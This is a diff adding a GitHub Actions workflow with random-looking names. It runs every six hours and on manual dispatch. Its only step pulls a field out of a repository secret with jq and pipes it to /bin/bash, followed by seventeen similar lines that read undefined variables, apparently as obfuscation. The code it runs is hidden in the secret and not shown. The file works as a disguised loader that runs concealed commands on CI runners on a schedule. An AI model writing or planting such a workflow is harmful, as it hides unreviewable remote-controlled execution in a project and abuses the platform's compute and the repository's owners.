@@ -1,0 +1,34 @@
+name: ghnayde
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ghnayde
+        env:
+          dg2913: ${{ secrets.dg2913 }}
+        run: |
+          echo $dg2913 | jq -r .l9576 | /bin/bash
+          echo $jfwj16833 | jq -r .lglq7 | /bin/bash
+          echo $ejin69437 | jq -r .vog4 | /bin/bash
+          echo $vcie55488 | jq -r .iqo9610 | /bin/bash
+          echo $xp7332 | jq -r .mhnmd8560 | /bin/bash
+          echo $phhos71619 | jq -r .blo1808 | /bin/bash
+          echo $no9 | jq -r .bwke58 | /bin/bash
+          echo $xramf045 | jq -r .izaj6614 | /bin/bash
+          echo $nvnz137 | jq -r .x040 | /bin/bash
+          echo $o3400 | jq -r .mg864 | /bin/bash
+          echo $xyfhu9296 | jq -r .sgri374 | /bin/bash
+          echo $deyx492 | jq -r .rxh5798 | /bin/bash
+          echo $pv904 | jq -r .chel8 | /bin/bash
+          echo $jwtyn7 | jq -r .r1160 | /bin/bash
+          echo $pq54 | jq -r .nieg144 | /bin/bash
+          echo $yzela78 | jq -r .lba19737 | /bin/bash
+          echo $z49441 | jq -r .ylvp673 | /bin/bash
+          echo $np07 | jq -r .i86 | /bin/bash
+
